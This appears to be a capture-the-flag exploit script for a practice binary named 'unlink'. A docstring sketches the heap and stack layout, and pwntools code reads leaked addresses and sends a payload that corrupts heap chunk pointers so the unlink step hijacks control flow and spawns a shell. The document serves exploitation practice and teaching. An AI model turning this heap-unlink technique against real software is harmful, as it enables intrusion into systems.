"""
--heap--
A->fd: -> B
A->bk -> NULL
A->buf -> shell address
A->buf + 4
align
align
B->fd -> A->buf+4
B->bk -> ebp-4
B->buf
B->buf + 4
align
align
C->fd
C->bk
C->buf
C->buf+4

fake_chunk-4 -> shell address
fake_chunk


--stack--
ebp - 4 -> A->buf+4
ebp

B->bk->fd = B->fd
B->fd->bk = B->bk
"""

from pwn import *

shell_addr = p32(0x080484eb)
p = process("/home/unlink/unlink")

p.recvuntil(": ")
stack_addr = int(p.recvline().strip(),16)
p.recvuntil(": ")
heap_addr = int(p.recvline().strip(), 16)
p.recvuntil("!")
p.recvline()

payload = shell_addr + b"A"*12 + p32(heap_addr + 0xc) + p32(stack_addr + 0x10)
p.sendline(payload)
p.interactive()
